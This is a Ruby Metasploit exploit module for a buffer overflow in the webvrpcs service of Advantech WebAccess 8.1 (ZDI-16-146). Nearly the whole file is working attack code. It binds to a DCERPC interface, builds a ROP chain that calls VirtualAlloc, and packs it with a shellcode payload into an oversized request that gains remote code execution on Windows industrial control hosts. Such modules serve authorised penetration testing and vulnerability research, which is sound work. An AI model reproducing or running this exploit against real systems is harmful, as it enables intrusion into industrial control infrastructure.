require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::DCERPC

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Advantech WebAccess webvrpcs Service BwWebSvc.dll ProjectName Buffer Overflow',
      'Description'    => %q{
          This module exploits a buffer overflow in AdvantechWebAccessUSANode8.1_20151230. By
          sending a specially crafted DCERPC request using opcode 0x13c80, an attacker may
          be able to execute arbitrary code.
      },
      'Author'         =>
        [
          'Mario Ceballos' 
        ],
      'License'        => 'BSD_LICENSE',
      'References'     =>
        [
          ['ZDI', '16-146']
        ],
      'Privileged'     => true,
      'DefaultOptions' =>
        {
	  'EXITFUNC' => 'thread',
	},
      'Payload'        =>
        {
          'BadChars' => "\x00",
          'PrependEncoder' => "\x81\xc4\xff\xef\xff\xff\x44",
          'Space'       => 350,
        },
      'Platform'      => %w{ win },
      'Targets'        =>
        [
         [ 'AdvantechWebAccessUSANode8.1_20151230', { 'Ret' => 0x41414141 } ], # Win7
        ],
      'DisclosureDate' => 'Feb 5 2016',
      'DefaultTarget'  => 0
      ))
    register_options( [ Opt::RPORT(4592) ], self.class )

  end

  def exploit
  connect
  handle = dcerpc_handle('5d2b62aa-ee0a-4a95-91ae-b064fdb471fc', '1.0', 'ncacn_ip_tcp', [datastore['RPORT']])
  dcerpc_bind(handle)
  print_status("Bound to #{handle} ...")

  resp   = dcerpc.call(0x4, [0x02000000].pack('V'))
  handle = resp.last(4).unpack('V').first

  ropnop = [0x07059d85].pack('V') * 12

  rop = 
    [
      0x07065cb3,  # POP EAX # RETN [BwPAlarm.dll] 
      0x02039128,  # ptr to &VirtualAlloc() [IAT BwKrlAPI.dll]
      0x02026ad6,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [BwKrlAPI.dll] 
      0x0201f808,  # XCHG EAX,ESI # ADD AL,2 # RETN [BwKrlAPI.dll] 
      0x0201b9d8,  # POP EBP # RETN [BwKrlAPI.dll] 
      0x0701bd32,  # & push esp # ret  [BwPAlarm.dll]
      0x02027edf,  # POP EAX # RETN [BwKrlAPI.dll] 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x07065c30,  # NEG EAX # RETN [BwPAlarm.dll] 
      0x07045371,  # PUSH EAX # ADD ESP,0C # POP EBX # RETN [BwPAlarm.dll] 
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x0202b4e0,  # POP EAX # RETN [BwKrlAPI.dll] 
      0xa1a10fd4,  # put delta into eax (-> put 0x00001000 into edx)
      0x07025e06,  # ADD EAX,5E5F0000 # POP EBX # ADD ESP,2C # RETN 0x0C [BwPAlarm.dll] 
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x07036da4,  # XCHG EAX,EDX # PUSH ES # POP ES # RETN [BwPAlarm.dll] 
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x0705c129,  # POP EAX # RETN [BwPAlarm.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x0703e5f3,  # NEG EAX # RETN [BwPAlarm.dll] 
      0x0202a050,  # XCHG EAX,ECX # ADD AL,2 # RETN [BwKrlAPI.dll] 
      0x07037fbb,  # POP EDI # RETN [BwPAlarm.dll] 
      0x07059d85,  # RETN (ROP NOP) [BwPAlarm.dll]
      0x02024806,  # POP EAX # RETN [BwKrlAPI.dll] 
      0x90909090,  # nop
      0x02037c7c,  # PUSHAD # RETN [BwKrlAPI.dll] 
    ].flatten.pack("V*")

  data = rand_text_alpha_upper(5024)
  data[264, ropnop.size] = ropnop
  data[312, rop.size + payload.encoded.size] = rop + payload.encoded
  data[1868, 4] = [0x07033fa8].pack('V')
 
  packet =  NDR.long(handle)
  packet << NDR.long(0x13C80)
  packet << NDR.long(data.size)
  packet << NDR.long(data.size)
  packet << NDR.string(data)

  print_status("Trying target #{target.name}...")
    begin
      dcerpc_call(0x1, packet)
    rescue Rex::Proto::DCERPC::Exceptions::NoResponse
    end

  end
end
